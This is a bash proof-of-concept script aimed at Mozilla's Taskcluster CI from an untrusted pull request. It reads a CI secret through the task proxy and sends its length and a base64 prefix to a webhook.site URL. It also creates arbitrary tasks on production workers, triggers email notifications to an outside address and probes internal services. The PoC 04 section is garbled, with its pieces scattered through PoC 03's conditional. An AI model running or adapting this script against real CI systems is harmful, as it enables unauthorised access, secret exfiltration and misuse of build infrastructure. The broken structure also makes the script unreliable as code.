#!/bin/bash
set -e

# ==================== CONFIG ====================
# Sửa 2 dòng này bằng giá trị của bạn
WEBHOOK_URL="https://webhook.site/2e7af29f-f5f5-4650-a012-99d14df3f88a"
MY_EMAIL="brian.baker@xketamine.me"
# ================================================

PROXY_URL="${TASKCLUSTER_PROXY_URL:-http://taskcluster}"
ROOT_URL="https://firefox-ci-tc.services.mozilla.com"
TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)

echo "========================================"
echo "[*] FirefoxCI PoC Suite - Untrusted PR"
echo "[*] Task ID: ${TASK_ID:-unknown}"
echo "[*] Started at: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "========================================"

# ------------------------------------------------
# PoC 01: Secret Read (dummy secret, no value printed)
# ------------------------------------------------
echo ""
echo "[*] === PoC 01: Secret Read ==="

SECRET_NAME="project/mozillavpn/ci/dummy-test-secret"
TMP_SECRET="/tmp/poc01_secret.json"

HTTP_STATUS=$(curl -s -o "$TMP_SECRET" -w "%{http_code}" \
  --max-time 10 --connect-timeout 5 \
  "${PROXY_URL}/api/secrets/v1/secret/${SECRET_NAME}" 2>/dev/null || echo "000")

echo "[*] Secrets API status: ${HTTP_STATUS}"

if [ "${HTTP_STATUS}" = "200" ]; then
    LEN=$(wc -c < "$TMP_SECRET")
    PREFIX=$(head -c 20 "$TMP_SECRET" | base64 -w 0)
    echo "[*] Secret ACCESSIBLE. Length: ${LEN} bytes"
    echo "[*] Prefix (base64): ${PREFIX}"
    # Confirm tới webhook (không gửi value)
    curl -s -o /dev/null "${WEBHOOK_URL}?poc=01&status=${HTTP_STATUS}&len=${LEN}&prefix=${PREFIX}" 2>/dev/null || true
    echo "[*] Confirm sent to webhook.site"
elif [ "${HTTP_STATUS}" = "403" ]; then
    echo "[*] Secret exists but role DENIED (status 403)"
else
    echo "[*] Secret not found or error (status ${HTTP_STATUS})"
fi
rm -f "$TMP_SECRET"

# ------------------------------------------------
# PoC 02: Secondary Task Creation
# ------------------------------------------------
echo ""
echo "[*] === PoC 02: Secondary Task Creation ==="

NEW_TASK_ID="poc02-$(date +%s)-${RANDOM}"
DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)

cat > /tmp/poc02_task.json <<EOF
{
  "provisionerId": "mozillavpn-1",
  "workerType": "b-linux-large",
  "schedulerId": "mozillavpn-level-1",
  "taskGroupId": "${NEW_TASK_ID}",
  "created": "${TIMESTAMP}",
  "deadline": "${DL}",
  "expires": "${EXP}",
  "metadata": {
    "name": "Secondary Task from Untrusted PR PoC",
    "description": "Proof of arbitrary task creation via pull-request-untrusted role",
    "owner": "security-research@example.com",
    "source": "https://github.com/mozilla-mobile/mozilla-vpn-client"
  },
  "payload": {
    "command": ["/bin/bash","-c","echo '[*] Secondary task executed on production worker'"],
    "image": "taskcluster/ubuntu:latest",
    "maxRunTime": 600
  }
}
EOF

STATUS=$(curl -s -o /tmp/poc02_resp.json -w "%{http_code}" \
  -X POST -H "Content-Type: application/json" -d @/tmp/poc02_task.json \
  --max-time 15 \
  "${PROXY_URL}/api/queue/v1/create-task/${NEW_TASK_ID}" 2>/dev/null || echo "000")

echo "[*] queue.createTask status: ${STATUS}"

if [ "${STATUS}" = "200" ]; then
    echo "[*] SUCCESS. New task ID: ${NEW_TASK_ID}"
    echo "[*] Verify: ${ROOT_URL}/api/queue/v1/task/${NEW_TASK_ID}/status"
    echo "[*] Inspector: ${ROOT_URL}/tasks/${NEW_TASK_ID}"
    # Tự verify
    VERIFY=$(curl -s -o /dev/null -w "%{http_code}" \
      "${ROOT_URL}/api/queue/v1/task/${NEW_TASK_ID}/status" 2>/dev/null || echo "000")
    echo "[*] Public verify: HTTP ${VERIFY}"
else
    echo "[*] FAILED (status: ${STATUS})"
fi
rm -f /tmp/poc02_task.json /tmp/poc02_resp.json

# ------------------------------------------------
# PoC 03: Notify Route (real email to inbox)
# ------------------------------------------------
echo ""
echo "[*] === PoC 03: Notify Route ==="

NOTIFY_TASK_ID="poc03-$(date +%s)-${RANDOM}"
DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)

cat > /tmp/poc03_task.json <<EOF
{
  "provisionerId": "mozillavpn-1",
  "workerType": "b-linux-large",
  "schedulerId": "mozillavpn-level-1",
  "taskGroupId": "${NOTIFY_TASK_ID}",
  "created": "${TIMESTAMP}",
  "deadline": "${DL}",
  "expires": "${EXP}",
  "routes": ["notify.email.${MY_EMAIL}.on-completed"],
  "metadata": {
    "name": "Notify Route PoC from Untrusted PR",
    "description": "Triggers real email notification to researcher inbox",
    "owner": "security-research@example.com",
    "source": "https://github.com/mozilla-mobile/mozilla-vpn-client"
  },
  "payload": {
    "command": ["/bin/bash","-c","echo '[*] Notify task completed'"],
    "image": "taskcluster/ubuntu:latest",
    "maxRunTime": 300
  }
}
EOF

STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST -H "Content-Type: application/json" -d @/tmp/poc03_task.json \
  --max-time 15 \
  "${PROXY_URL}/api/queue/v1/create-task/${NOTIFY_TASK_ID}" 2>/dev/null || echo "000")

echo "[*] createTask status: ${STATUS}"

if [ "${STATUS}" = "200" ]; then
    echo "[*] SUCCESS. Check inbox ${MY_EMAIL} in 2-5 minutes."
    echo "[*] Task: ${ROOT_URL}/tasks/${NOTIFY_TASK_ID}"
else
    echo "[*] FAILED (status: ${STATUS})"
# PoC 04: Internal Service Probe
# ------------------------------------------------

for svc in \
  "http://auth/" \
  "http://queue/" \
  "http://hooks/" \
  "http://notify/" \
  "http://index/" \
  "http://github/" \
  "http://web-server/" \
  "${PROXY_URL}/"; do
    RESULT=$(curl -s -o /dev/null -w "%{http_code},%{size_download}" \
      --max-time 5 --connect-timeout 3 \
      "$svc" 2>/dev/null || echo "000,0")
    S=$(echo "$RESULT" | cut -d',' -f1)
    L=$(echo "$RESULT" | cut -d',' -f2)
    printf "%-25s | %-6s | %-10s\n" "$svc" "$S" "${L}b"
done

echo ""
echo "[*] Services returning HTTP 200 with non-zero length are REACHABLE."
echo "[*] This log is the proof — screenshot or download artifact."

echo ""
echo "[*] === All PoCs completed ==="  "http://secrets/" \
  "http://object/" \
  "http://worker-manager/" \
echo ""
printf "%-25s | %-6s | %-10s\n" "SERVICE" "STATUS" "LENGTH"
printf "%-25s-+-%6s-+-%10s\n" "-------------------------" "------" "----------"
echo "[*] === PoC 04: Internal Service Probe ==="
echo "[*] Probing internal K8s services (status + length only)..."

fi
rm -f /tmp/poc03_task.json
# ------------------------------------------------

